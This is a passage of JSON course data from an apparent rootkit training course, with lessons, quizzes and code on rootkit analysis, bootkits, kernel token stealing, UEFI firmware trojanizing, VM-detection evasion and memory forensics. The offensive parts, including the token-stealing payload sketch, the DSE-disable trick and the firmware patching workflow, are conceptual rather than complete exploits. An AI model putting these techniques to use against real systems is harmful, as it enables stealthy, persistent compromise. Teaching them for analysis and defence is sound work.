                                "HTML"
                            ],
                            "correct": 2,
                            "explanation": "C and C++ are the languages of choice for system-level programming and are highly portable, making them ideal for the core logic of a cross-platform rootkit. The low-level, platform-specific modules would then also be written in C/C++ with OS-specific APIs."
                        }
                    ]
                }
            },
            {
                "id": "lesson-29",
                "title": "Rootkit Analysis and Reverse Engineering",
                "duration": "100 min",
                "objectives": [
                    "Classify rootkits into families based on their behavior and code.",
                    "Use advanced static and dynamic analysis techniques to deconstruct a rootkit.",
                    "Develop automated systems for unpacking and analyzing rootkits.",
                    "Generate signatures (e.g., YARA rules) to detect specific rootkit families.",
                    "Apply memory forensics as the primary tool for rootkit analysis."
                ],
                "content": {
                    "overview": "This lesson focuses on the defensive side: the reverse engineering and analysis of the advanced rootkits we've been studying. We will explore the specific techniques required to deconstruct a rootkit's components, understand its functionality, and generate the intelligence needed to detect and remove it.",
                "sections": [
                    {
                        "title": "Rootkit Family Classification",
                        "content": "<p>Like other malware, rootkits are classified into families based on shared characteristics. An analyst will look for:</p><ul><li><strong>Code Similarity:</strong> Using binary diffing tools to find shared functions.</li><li><strong>Behavioral Patterns:</strong> Does the rootkit use the same method of hooking (e.g., SSDT vs. inline)? Does it use the same DKOM technique?</li><li><strong>C&C Infrastructure:</strong> Does it communicate with the same domains or use the same custom protocol?</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "The Central Role of Memory Forensics",
                            "content": "<p>As we've seen, rootkits are designed to lie to the operating system. Therefore, any analysis performed from *within* the infected OS is unreliable. **Memory forensics is the single most effective way to analyze a rootkit.**</p><p>By acquiring a memory dump and analyzing it from a trusted, external forensic workstation, an analyst can get a truthful, ground-up view of the system's state. Memory analysis allows an analyst to bypass the rootkit's hooks and find the discrepancies (e.g., via cross-view validation) that prove its existence.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Signature Generation",
                            "content": "<p>Once a rootkit is understood, the final step is to generate signatures to detect it on other systems.</p><p><strong>Real-world Example: YARA Rule Generation.</strong> A researcher has just finished reverse engineering a new kernel-mode rootkit. They discovered that the rootkit's driver contains several unique, hardcoded string artifacts that are used for debugging. The researcher can create a YARA rule that looks for the presence of these unique strings *in kernel memory*. This YARA rule can then be run against memory dumps from other systems, or used in a live scanning tool, to quickly and reliably identify other machines infected with the same rootkit family.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Rootkit Signature Generation (YARA)",
                            "language": "c",
                            "code": "// This is a YARA rule designed to detect a specific rootkit by looking for\n// artifacts in a memory dump of a Windows system.\n\nrule TDL4_Rootkit_Memory_Signature {\n\n   meta:\n      description = \"Detects artifacts of the TDL4/Alureon kernel-mode rootkit in memory.\"\n      author = \"Rootkit Research Course\"\n\n   strings:\n      // Unique strings found in the rootkit's driver file\n      $s1 = { 47 45 54 5f 50 52 4f 43 5f 41 44 44 52 } // \"GET_PROC_ADDR\"\n      $s2 = { 48 49 44 45 5f 50 52 4f 43 45 53 53 } // \"HIDE_PROCESS\"\n      \n      // A unique mutex name the rootkit creates\n      $mutex = \"_TdlMutex_\"\n\n   condition:\n      // The condition for a match is that the memory dump contains all three of these strings.\n      all of them\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the most effective and reliable method for detecting and analyzing a kernel-mode rootkit?",
                            "options": [
                                "Running a standard antivirus scan from within the infected OS.",
                                "Performing a full memory analysis from an external, trusted environment and using cross-view validation techniques.",
                                "Checking the browser history.",
                                "Rebooting the computer."
                            ],
                            "correct": 1,
                            "explanation": "A rootkit is designed to lie to any software running within the compromised OS. The only way to get a truthful view is to analyze the system from the outside (via a memory dump) and compare what the OS *says* is happening with what the raw kernel structures *actually* show."
                        },
                        {
                            "id": 2,
                            "question": "The technique of comparing the output of a high-level API call (like listing processes) with the raw data from the underlying kernel structures in a memory dump is known as:",
                            "options": [
                                "Signature-based detection",
                                "Heuristic detection",
                                "Cross-view validation",
                                "File integrity monitoring"
                            ],
                            "correct": 2,
                            "explanation": "Cross-view validation is the core of rootkit detection. By comparing a high-level, easily hooked view with a low-level, raw view, an analyst can spot the inconsistencies that prove a rootkit is manipulating the OS."
                        },
                        {
                            "id": 3,
                            "question": "What is the primary purpose of creating a YARA rule after analyzing a new rootkit?",
                            "options": [
                                "To reverse engineer the rootkit.",
                                "To create a signature that can be used to quickly and automatically detect the same rootkit on other systems.",
                                "To document the rootkit's behavior.",
                                "To get the rootkit to run."
                            ],
                            "correct": 1,
                            "explanation": "A YARA rule is a way of codifying the unique fingerprints of a malware family. It operationalizes the findings of the research, turning the manual analysis into an automated detection that can be deployed at scale."
                        }
                    ]
                }
            },
            {
                "id": "lesson-30",
                "title": "Advanced Bootkit Techniques",
                "duration": "100 min",
                "objectives": [
                    "Design and develop a multi-stage bootkit.",
                    "Implement advanced boot process hijacking techniques.",
                    "Develop a rootkit that can persist in the firmware of a peripheral device.",
                    "Analyze and bypass recovery partition protections.",
                    "Combine multiple techniques to create a highly persistent and stealthy bootkit."
                ],
                "content": {
                    "overview": "This lesson explores the most advanced techniques for boot-time malware. We will cover the development of multi-stage bootkits that can survive OS reinstalls, the infection of device firmware, and the methods used to hijack the system's own recovery environment to maintain persistence.",
                "sections": [
                    {
                        "title": "Multi-Stage Bootkit Development",
                        "content": "<p>A sophisticated bootkit uses multiple stages to be more flexible and stealthy.</p><h3>A Typical Staged Architecture:</h3><ol><li><strong>Stage 1 (The Infector):</strong> This is the initial payload that infects the MBR or UEFI firmware. Its only job is to get a very small, second-stage loader to run.</li><li><strong>Stage 2 (The Loader):</strong> This loader is stored in a hidden part of the disk (like a remapped bad sector). Its job is to find, decrypt, and load the main rootkit driver into memory.</li><li><strong>Stage 3 (The Kernel Rootkit):</strong> This is the main rootkit driver, which contains all the hooking and hiding logic.</li></ol><p>This staged approach makes analysis more difficult, as the investigator must find and reconstruct all the different pieces of the puzzle.</p>",
                            "image": "https://images.unsplash.com/photo-1593435713588-a73de23947db?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Firmware Rootkit Implementation",
                            "content": "<p>As discussed, a rootkit that infects the firmware of a peripheral device (like a network card or a hard drive) is extremely persistent.</p><p>Developing such a rootkit requires a highly specialized skillset. The researcher must first reverse engineer the legitimate firmware for that specific piece of hardware. They must then find a way to modify it to include their own malicious code, and then find a way to flash this modified firmware back onto the device's chip. This is the pinnacle of persistence research.</p>",
                            "image": "https://images.unsplash.com/photo-1575235028124-ab6346a5a0a3?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Recovery Partition Exploitation",
                            "content": "<p>Modern operating systems have a hidden recovery partition (the Windows Recovery Environment or WinRE) that is used for system repair.</p><p><strong>Real-world Example:</strong> An attacker gains administrative access to a system. They can mount the hidden WinRE partition. They can then modify the legitimate recovery tools on that partition to include their own malicious code. The next time the user boots into the recovery environment to try and fix their machine, they will be unknowingly running the attacker's malware. This is a powerful persistence technique because most antivirus scanners do not scan the recovery partition.</p>",
                            "image": "https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Multi-Stage Bootkit Architecture (Conceptual)",
                            "language": "markdown",
                            "code": "# Conceptual Flow of a Multi-Stage MBR Bootkit\n\n1.  **Initial Infection:**\n    - A user-mode dropper runs with admin rights.\n    - It saves the original MBR to a hidden sector (e.g., sector 60).\n    - It writes the Stage 1 bootkit code to the MBR (sector 0).\n    - It writes the Stage 2 loader code to another hidden sector (e.g., sector 61).\n\n2.  **System Reboot:**\n    - The BIOS loads and executes the Stage 1 code from the MBR.\n\n3.  **Stage 1 Execution (in MBR):**\n    - The code's only job is to use `INT 13h` to read the Stage 2 loader from sector 61 into memory.\n    - It then jumps to the Stage 2 code.\n\n4.  **Stage 2 Execution (in Memory):**\n    - The loader's job is to infect the OS bootloader.\n    - It finds the OS bootloader on disk (e.g., `bootmgr`).\n    - It reads the bootloader into memory, patches it to load the main rootkit driver, and then allows the boot process to continue.\n\n5.  **OS Boot:**\n    - The patched OS bootloader runs, which loads the main kernel rootkit driver.\n    - The Stage 3 rootkit is now active and can hide the bootkit's presence on the disk."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the primary advantage of a multi-stage bootkit architecture?",
                            "options": [
                                "It makes the bootkit run faster.",
                                "It makes the bootkit easier to write.",
                                "It increases stealth and flexibility by breaking the malware into smaller, specialized components, with only a tiny loader in the initial MBR/UEFI.",
                                "It only works on Linux."
                            ],
                            "correct": 2,
                            "explanation": "A staged approach is a classic software engineering and malware design pattern. It makes the initial footprint much smaller and harder to detect, and allows the attacker to more easily update the main payload without having to re-infect the boot record."
                        },
                        {
                            "id": 2,
                            "question": "A rootkit that infects the firmware of a hard drive is particularly persistent because:",
                            "options": [
                                "It can make the hard drive spin faster.",
                                "It is easy to detect with antivirus.",
                                "It resides on the drive's own controller chip and will survive a full format and OS reinstall.",
                                "It can only be written in Python."
                            ],
                            "correct": 2,
                            "explanation": "Firmware-level persistence is extremely powerful because the malware resides on a component separate from the main OS storage. This allows it to persist even if the entire hard drive is reformatted."
                        },
                        {
                            "id": 3,
                            "question": "Why is the Windows Recovery Environment (WinRE) an attractive target for an attacker seeking persistence?",
                            "options": [
                                "It is not an attractive target.",
                                "Because it is a hidden partition that is often not scanned by antivirus, and the user will run the attacker's code when they try to repair their system.",
                                "Because it is easy to delete.",
                                "Because it contains all the user's passwords."
                            ],
                            "correct": 1,
                            "explanation": "WinRE is a trusted part of the operating system. By trojanizing the recovery tools, an attacker can achieve a very stealthy and effective persistence mechanism that the user themselves will trigger."
                        }
                    ]
                }
            },
            {
                "id": "lesson-31",
                "title": "Kernel Exploitation for Rootkits",
                "duration": "100 min",
                "objectives": [
                    "Perform advanced kernel vulnerability exploitation.",
                    "Chain multiple kernel vulnerabilities for a reliable exploit.",
                    "Develop privilege escalation techniques to move from user-mode to kernel-mode.",
                    "Implement kernel code injection methods.",
                    "Use a kernel exploit to establish a persistent rootkit."
                ],
                "content": {
                    "overview": "This lesson focuses on the critical bridge between exploit development and rootkit development: the kernel exploit. We will explore the advanced techniques used to turn a vulnerability in the operating system kernel into the initial foothold that allows a rootkit to be installed and achieve Ring 0 execution.",
                "sections": [
                    {
                        "title": "Kernel Vulnerability Exploitation",
                        "content": "<p>Exploiting the kernel is a high-stakes activity. A mistake will not just crash a process; it will crash the entire system with a Blue Screen of Death or a Kernel Panic.</p><h3>The Goal: Arbitrary Read/Write</h3><p>The initial goal of many kernel exploits is not to get code execution directly, but to gain two powerful primitives:</p><ul><li><strong>Arbitrary Read:</strong> The ability to read the contents of any arbitrary address in kernel memory.</li><li><strong>Arbitrary Write:</strong> The ability to write an arbitrary value to any arbitrary address in kernel memory.</li></ul><p>With these two primitives, an attacker can defeat most kernel security mitigations and achieve reliable code execution.</p>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Privilege Escalation Chains",
                            "content": "<p>A full exploit chain to install a rootkit often looks like this:</p><ol><li>The attacker has a low-privileged shell on the system.</li><li>They run an exploit for a kernel vulnerability.</li><li>The exploit gives them an arbitrary kernel read/write primitive.</li><li>They use their arbitrary read to find the `EPROCESS` (or `task_struct`) of their own process and the `SYSTEM` or `root` process.</li><li>They use their arbitrary write to perform a 'token stealing' attack, replacing their own process's low-privileged access token with the token from the high-privileged `SYSTEM` process.</li><li>Their shell is now running as `NT AUTHORITY\\SYSTEM`. They now have the privileges to load their malicious driver.</li><li>They load their rootkit driver, which establishes the final, stealthy persistence.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Kernel Code Injection",
                            "content": "<p>Once an attacker has the ability to write to kernel memory, they can inject their shellcode directly into the kernel.</p><p><strong>Real-world Example:</strong> To bypass Driver Signature Enforcement, an attacker can use their arbitrary write primitive to simply flip a global variable in the kernel (`g_ciOptions`) from `1` (enabled) to `0` (disabled). Once DSE is disabled, they can use the standard `LoadDriver` API to load their unsigned rootkit driver without any issues. This is a common technique used by sophisticated exploits.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Kernel Privilege Escalation (Token Stealing)",
                            "language": "c",
                            "code": "// This is a conceptual C++ kernel exploit payload demonstrating token stealing on Windows.\n// This code would run in Ring 0 after the initial vulnerability is triggered.\n\n// Assume we have our arbitrary read/write primitives: ReadKernelMemory() and WriteKernelMemory().\n\n// 1. Get the address of the EPROCESS block for our current (attacker) process.\nPEPROCESS currentProcess = PsGetCurrentProcess();\n\n// 2. Find the SYSTEM process (PID 4).\nPEPROCESS systemProcess = FindProcessByPID(4);\n\n// 3. Get the token from the SYSTEM process.\n//    The token is an opaque pointer at a specific offset in the EPROCESS structure.\n//    This offset is version-dependent and must be found via reverse engineering.\nvoid* systemToken;\nReadKernelMemory((BYTE*)systemProcess + tokenOffset, &systemToken, sizeof(void*));\n\n// 4. Overwrite our process's token with the SYSTEM token.\nWriteKernelMemory((BYTE*)currentProcess + tokenOffset, &systemToken, sizeof(void*));\n\n// At this point, our user-mode process has been elevated to NT AUTHORITY\\SYSTEM."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the primary goal of most modern kernel exploits?",
                            "options": [
                                "To crash the computer with a Blue Screen of Death.",
                                "To gain the primitives of 'arbitrary kernel read' and 'arbitrary kernel write'.",
                                "To delete the operating system.",
                                "To bypass the firewall."
                            ],
                            "correct": 1,
                            "explanation": "Gaining arbitrary read/write is the key. With these two primitives, an attacker can systematically defeat other security mitigations like KASLR and then achieve reliable code execution or privilege escalation."
                        },
                        {
                            "id": 2,
                            "question": "The technique of using a kernel exploit to replace a process's low-privileged access token with the high-privileged token of the SYSTEM process is known as:",
                            "options": [
                                "SSDT Hooking",
                                "Token Stealing",
                                "A buffer overflow",
                                "A bootkit"
                            ],
                            "correct": 1,
                            "explanation": "Token stealing is a classic and highly effective Windows privilege escalation technique. Once an attacker has a kernel-level write primitive, it is one of the most direct ways to become SYSTEM."
                        },
                        {
                            "id": 3,
                            "question": "A kernel exploit can be used to bypass Driver Signature Enforcement (DSE) by doing what?",
                            "options": [
                                "By asking the user for their password.",
                                "By using an arbitrary kernel write to flip the global `g_ciOptions` variable from 1 to 0.",
                                "By deleting the driver that needs to be loaded.",
                                "It cannot be used to bypass DSE."
                            ],
                            "correct": 1,
                            "explanation": "This is a common technique. Instead of a complex bypass, the exploit simply finds the global 'on/off' switch for DSE in kernel memory and flips it, allowing the attacker to then load any unsigned driver they want."
                        }
                    ]
                }
            },
            {
                "id": "lesson-32",
                "title": "Firmware and Hardware Rootkits",
                "duration": "100 min",
                "objectives": [
                    "Perform modification of BIOS/UEFI firmware to install a persistent implant.",
                    "Simulate the functionality of a hardware implant.",
                    "Analyze the attack surface of the baseband processor in mobile devices.",
                    "Investigate the potential for rootkits in network card and storage device firmware."
                ],
                "content": {
                    "overview": "This lesson covers the most advanced and persistent form of rootkit: those that infect the firmware of hardware components. We will explore how an attacker can achieve persistence that survives a complete OS reinstall by implanting their code directly onto the chips of the motherboard, the hard drive, or other peripheral devices.",
                "sections": [
                    {
                        "title": "BIOS/UEFI Firmware Modification",
                        "content": "<p>A firmware rootkit works by modifying the legitimate firmware image on the motherboard's SPI flash chip and then re-flashing it.</p><h3>The Attack Process:</h3><ol><li>The attacker gains administrative access to the target system.</li><li>They dump the current BIOS/UEFI firmware from the chip to a file.</li><li>They use reverse engineering tools to find a place to insert their malicious code (their 'implant').</li><li>They patch the firmware image file with their implant.</li><li>They use a legitimate flashing utility to overwrite the existing firmware on the motherboard with their malicious version.</li></ol><p>Now, every time the computer boots, the attacker's code runs before the OS, giving them complete control.</p>",
                            "image": "https://images.unsplash.com/photo-1593435713588-a73de23947db?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Hardware Implants and Baseband Exploitation",
                            "content": "<p>A true hardware implant is a malicious modification to a device's circuit board, often done as a 'supply chain' attack before the device ever reaches the customer.</p><h3>Baseband Processor Exploitation:</h3><p>A mobile phone has two main computers: the main Application Processor (AP) that runs iOS or Android, and a second, smaller computer called the Baseband Processor (BP) that runs a real-time OS (RTOS) and is responsible for all communication with the cellular network. The baseband is a complete 'black box'. A rootkit that compromises the baseband processor can intercept all calls and data, and it is completely invisible to any security software running on the main Application Processor. This is an extremely advanced attack vector.</p>",
                            "image": "https://images.unsplash.com/photo-1575235028124-ab6346a5a0a3?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Storage and Network Firmware Manipulation",
                            "content": "<p><strong>Real-world Example: The Equation Group Hard Drive Implant.</strong> A highly advanced APT group, believed to be the NSA, developed a rootkit that could re-flash the firmware of hard drives from over a dozen different manufacturers. Their user-mode tool could infect the firmware of the drive itself. The malicious firmware would create a hidden, secret storage area on the drive. The implant could survive a full, multi-pass secure wipe of the drive. Every time the computer booted, the malicious hard drive firmware would infect the MBR, which would then infect the OS. This represents one of the most powerful and persistent malware platforms ever discovered.</p>",
                            "image": "https://images.unsplash.com/photo-1552392187-952b1e4f4a3e?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Firmware Modification Tools (UEFITool)",
                            "language": "bash",
                            "code": "# This is a conceptual workflow using UEFITool, a common tool for analyzing\n# and modifying UEFI firmware images.\n\nFIRMWARE_IMAGE=\"bios.bin\"\n\n# 1. Open the firmware image in UEFITool's GUI.\n#    The tool will parse the image and display its hierarchical structure of\n#    volumes, files, and sections.\n\n# 2. The researcher browses the structure to find a DXE driver that is a good\n#    candidate for patching (e.g., one that is executed on every boot).\n\n# 3. The researcher extracts that specific driver's section to a file.\n#    (e.g., 'ExtractedDriver.ffs')\n\n# 4. They use a reverse engineering tool like IDA Pro or Ghidra to find a code cave\n#    in the driver and insert their malicious shellcode.\n\n# 5. They use UEFITool to replace the original driver section in the main firmware image\n#    with their new, patched version.\n\n# 6. The researcher now has a file, 'patched_bios.bin', which is the complete, trojanized\n#    firmware image, ready to be flashed to a target machine."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the primary method for installing a UEFI firmware rootkit on a target machine?",
                            "options": [
                                "By sending a phishing email.",
                                "By gaining administrative access to the OS and then using a legitimate utility to 'flash' a modified firmware image to the motherboard's SPI chip.",
                                "By using a buffer overflow.",
                                "By infecting a USB drive."
                            ],
                            "correct": 1,
                            "explanation": "A firmware rootkit requires overwriting the contents of the motherboard's firmware chip. This typically requires administrative privileges on the running OS to execute the flashing utility."
                        },
                        {
                            "id": 2,
                            "question": "A rootkit that compromises the separate, black-box processor that manages a phone's cellular communication is known as a:",
                            "options": [
                                "UEFI rootkit",
                                "Baseband rootkit",
                                "Kernel rootkit",
                                "User-mode rootkit"
                            ],
                            "correct": 1,
                            "explanation": "The baseband processor is a highly attractive target because it has full control over the phone's communication and is almost completely opaque to the main application processor, making a rootkit there extremely stealthy."
                        },
                        {
                            "id": 3,
                            "question": "The Equation Group APT was famous for developing a rootkit that could infect what?",
                            "options": [
                                "The web browser.",
                                "The firmware of the hard drive itself.",
                                "The network card.",
                                "The keyboard."
                            ],
                            "correct": 1,
                            "explanation": "This was a landmark discovery in malware research. It demonstrated that even the hard drive's own controller could be reprogrammed to act as an incredibly persistent and stealthy rootkit."
                        }
                    ]
                }
            },
            {
                "id": "lesson-33",
                "title": "Anti-Rootkit Technology and Bypasses",
                "duration": "100 min",
                "objectives": [
                    "Analyze the inner workings of commercial anti-rootkit and EDR tools.",
                    "Develop techniques to bypass sandbox and virtualization detection.",
                    "Fingerprint analysis tools to evade them.",
                    "Develop counter-surveillance techniques to detect when you are being analyzed.",
                    "Apply these bypass techniques to a final, stealthy rootkit project."
                ],
                "content": {
                    "overview": "This lesson focuses on the final stage of the arms race: bypassing the very tools designed to detect our rootkits. We will reverse engineer anti-rootkit technologies to understand how they work, and then develop a suite of advanced bypass techniques to make our creations as invisible as possible, even to a dedicated investigator.",
                "sections": [
                    {
                        "title": "Analyzing Anti-Rootkit and EDR Tools",
                        "content": "<p>To defeat a defensive tool, you must first understand how it works. This involves reverse engineering the tool itself.</p><h3>The Process:</h3><p>A researcher will load the kernel driver of an EDR product into Ghidra. They will analyze its code to understand: What kernel callbacks does it register? What system calls does it hook? What specific artifacts does it look for? By understanding its detection logic, the researcher can then design a rootkit that specifically avoids those behaviors.</p>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Sandbox and Virtualization Bypass",
                            "content": "<p>As we've discussed, rootkits and malware will often check if they are running in a VM.</p><p><strong>Real-world Example: Red Pill.</strong> 'Red Pill' was a famous, early technique for detecting a VM. It executed a specific assembly instruction (`SIDT`) and checked the result. On a real machine, the result would be in a certain memory range. Inside a VM, the result would be in a different range. Modern anti-VM techniques are much more sophisticated, often involving timing checks or looking for subtle hardware inconsistencies that are unique to a virtualized environment.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Tool Fingerprinting and Counter-Surveillance",
                            "content": "<p>A rootkit can also actively look for the presence of forensic tools.</p><p><strong>Real-world Example:</strong> A rootkit, upon starting, can check for the presence of common forensic tool processes (e.g., `x64dbg.exe`), registry keys known to be created by those tools, or even specific network traffic patterns from an analysis sandbox. If it detects any of these, it can choose to terminate itself or enter a dormant, benign state, hiding its true purpose from the analyst. This is a common technique used by sophisticated malware to make dynamic analysis much more difficult.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "VM Detection Bypass (CPUID)",
                            "language": "c",
                            "code": "// This is a C++ snippet demonstrating a common method for detecting a hypervisor.\n// The CPUID instruction can be used to query features of the CPU.\n\n#include <intrin.h>\n\nbool is_hypervisor_present() {\n    int cpu_info[4];\n    \n    // When the 'leaf' for the hypervisor CPUID is queried (0x40000000),\n    // a real CPU will not return anything significant. A hypervisor, however,\n    // will return its signature in the EBX, ECX, and EDX registers.\n    __cpuid(cpu_info, 0x40000000);\n\n    // Example: Microsoft's Hyper-V returns \"Microsoft Hv\"\n    // We can create a string from the register values.\n    char signature[13];\n    memcpy(signature, &cpu_info[1], 4); // EBX\n    memcpy(signature + 4, &cpu_info[2], 4); // ECX\n    memcpy(signature + 8, &cpu_info[3], 4); // EDX\n    signature[12] = '\\0';\n\n    if (strcmp(signature, \"Microsoft Hv\") == 0) {\n        return true;\n    }\n\n    return false;\n}\n\n// A rootkit would perform this check, and if it returns true, it would refuse to run."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the primary motivation for a researcher to reverse engineer a defensive product like an EDR?",
                            "options": [
                                "To steal its source code.",
                                "To understand its detection logic in order to develop bypass techniques.",
                                "To find out how much it costs.",
                                "To report the researcher to the vendor."
                            ],
                            "correct": 1,
                            "explanation": "This is a key part of the security arms race. Offensive researchers will analyze defensive products to find their weaknesses, and defensive researchers will analyze malware to find its weaknesses."
                        },
                        {
                            "id": 2,
                            "question": "A rootkit that checks for the presence of VMware or VirtualBox-specific registry keys is performing what kind of check?",
                            "options": [
                                "Anti-debugging",
                                "Anti-virtual machine",
                                "Code obfuscation",
                                "A timing attack"
                            ],
                            "correct": 1,
                            "explanation": "This is a classic anti-VM or anti-sandbox technique. The malware is checking for artifacts of the virtual environment to determine if it is being analyzed."
                        },
                        {
                            "id": 3,
                            "question": "The famous 'Red Pill' technique was an early proof-of-concept for what?",
                            "options": [
                                "Hiding a process.",
                                "Detecting the presence of a virtual machine by analyzing the result of the `SIDT` instruction.",
                                "Hooking the SSDT.",
                                "Bypassing a firewall."
                            ],
                            "correct": 1,
                            "explanation": "Red Pill was a foundational piece of research in virtualization detection. It demonstrated that there were subtle differences in how a CPU behaved on bare metal versus inside a VM, and that these differences could be used by malware to detect an analysis environment."
                        }
                    ]
                }
            },
            {
                "id": "lesson-34",
                "title": "Rootkit Forensics and Incident Response",
                "duration": "100 min",
                "objectives": [
                    "Identify common on-disk and in-memory artifacts of a rootkit infection.",
                    "Apply memory forensics as the primary tool for rootkit detection.",
                    "Use network forensics to analyze a rootkit's C&C traffic.",
                    "Develop a comprehensive timeline of a rootkit's installation and activity.",
                    "Follow a structured process for preserving evidence during a rootkit investigation."
                ],
                "content": {
                    "overview": "This lesson focuses on the defender's response to a suspected rootkit infection. We will cover the complete forensic process, from the initial detection of anomalous behavior to the deep memory and disk analysis required to find the rootkit, understand its capabilities, and preserve the evidence for a potential prosecution.",
                "sections": [
                    {
                        "title": "Rootkit Artifact Identification",
                        "content": "<p>Finding a rootkit is a process of finding inconsistencies and anomalies.</p><h3>Common Indicators:</h3><ul><li><strong>On-Disk Artifacts:</strong> A suspicious, unsigned driver file (`.sys`) in the `system32\\drivers` directory. Strange persistence entries in the registry.</li><li><strong>In-Memory Artifacts:</strong> Discrepancies found through cross-view validation (e.g., `psscan` vs. `pslist`). Hooks in the SSDT or other kernel tables.</li><li><strong>Network Artifacts:</strong> Strange, low-and-slow beaconing traffic to an unknown domain. DNS queries for long, random-looking hostnames.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Memory Forensics for Rootkits",
                            "content": "<p>As we've emphasized, **memory forensics is the single most effective way to detect a rootkit.** A rootkit is designed to lie to the live OS, so any tool run from within the compromised system cannot be trusted. By analyzing a memory dump from a trusted, external forensic workstation, an analyst can get a ground-truth view of what was really happening in the kernel.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Timeline Reconstruction",
                            "content": "<p>The goal of the investigation is to create a full timeline of the incident.</p><p><strong>Real-world Example:</strong> An investigation proceeds as follows:</p><ol><li><strong>Network Forensics:</strong> A network analyst finds suspicious DNS beaconing from a specific workstation that started at 14:30.</li><li><strong>Disk Forensics:</strong> A disk image of the workstation is taken. The analyst creates a super-timeline of all file system and registry activity. They find that at 14:25, a malicious driver file named `evil.sys` was written to disk. At 14:26, a registry key was created to load this driver as a service.</li><li><strong>Memory Forensics:</strong> A memory dump is taken. The analyst confirms that the `evil.sys` driver is loaded in kernel memory and has hooked the SSDT. They also see the active network connection that corresponds to the beaconing.</li></ol><p>By correlating these three sources, the analyst has a complete story: the rootkit was installed at 14:25, established persistence at 14:26, and began its C&C communication at 14:30.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Rootkit Artifact Analysis (Volatility)",
                            "language": "bash",
                            "code": "# This script is a common workflow for hunting for a rootkit in a memory dump.\n\nMEMORY_DUMP=\"infected_host.mem\"\n\n# 1. Check for hidden processes using cross-view validation.\ndiff <(vol -f $MEMORY_DUMP windows.pslist | awk '{print $1}') <(vol -f $MEMORY_DUMP windows.psscan | awk '{print $1}')\n\n# 2. Check for hidden kernel modules.\ndiff <(vol -f $MEMORY_DUMP windows.modules | awk '{print $1}') <(vol -f $MEMORY_DUMP windows.modscan | awk '{print $1}')\n\n# 3. Check for hooks in the System Service Descriptor Table (SSDT).\nvol -f $MEMORY_DUMP windows.ssdt\n\n# 4. Check for unsigned drivers.\nvol -f $MEMORY_DUMP windows.driverscan | grep \"False\"\n\n# An analyst would run these commands and look for any discrepancies or suspicious entries,\n# which are the key indicators of a kernel-level compromise."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the most effective and reliable method for detecting a kernel-mode rootkit?",
                            "options": [
                                "Running a standard antivirus scan from within the infected OS.",
                                "Performing a full memory analysis from an external, trusted environment and using cross-view validation techniques.",
                                "Checking the browser history.",
                                "Rebooting the computer."
                            ],
                            "correct": 1,
                            "explanation": "A rootkit is designed to lie to any software running within the compromised OS. The only way to get a truthful view is to analyze the system from the outside (via a memory dump) and compare what the OS *says* is happening with what the raw kernel structures *actually* show."
                        },
                        {
                            "id": 2,
                            "question": "An analyst compares the output of `pslist` and `psscan` in Volatility and finds a discrepancy. This is an example of what detection principle?",
                            "options": [
                                "Signature-based detection",
                                "Heuristic detection",
                                "Cross-view validation",
                                "File integrity monitoring"
                            ],
                            "correct": 2,
                            "explanation": "Cross-view validation is the core of rootkit detection. By comparing a high-level, easily hooked view (`pslist`) with a low-level, raw view (`psscan`), an analyst can spot the inconsistencies that prove a rootkit is manipulating the OS."
                        },
                        {
                            "id": 3,
                            "question": "Finding a suspicious, unsigned `.sys` file in the `C:\\Windows\\System32\\drivers` directory is an example of what kind of forensic artifact?",
                            "options": [
                                "A memory artifact",
                                "A network artifact",
                                "An on-disk artifact",
                                "A browser artifact"
                            ],
                            "correct": 2,
                            "explanation": "The driver file itself resides on the disk. This on-disk artifact is a key indicator that a kernel-mode component has been installed and is a critical piece of evidence to collect and analyze."
                        }
                    ]
                }
            },
            {
                "id": "lesson-35",
                "title": "Advanced Rootkit Architectures",
                "duration": "100 min",
                "objectives": [
                    "Design and analyze a distributed rootkit system.",
